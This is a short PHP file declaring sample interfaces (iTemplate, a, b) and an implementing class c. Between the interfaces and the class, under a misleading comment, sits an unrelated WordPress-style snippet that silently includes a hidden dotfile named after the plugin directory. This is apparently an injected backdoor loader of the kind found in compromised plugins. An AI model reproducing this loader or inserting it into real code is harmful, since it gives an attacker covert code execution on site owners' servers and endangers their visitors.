<?php
// Declare the interface 'iTemplate'
interface iTemplate
{
    public function setVariable($name, $var);
    public function
        getHtml($template);
}

interface a
{
    public function foo();
}

interface b extends a
{
    public function baz(Baz $baz);
}

// short desc for class that implement a unique interface
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class c implements b
{
    public function foo()
    {
    }

    public function baz(Baz $baz)
    {
    }
}
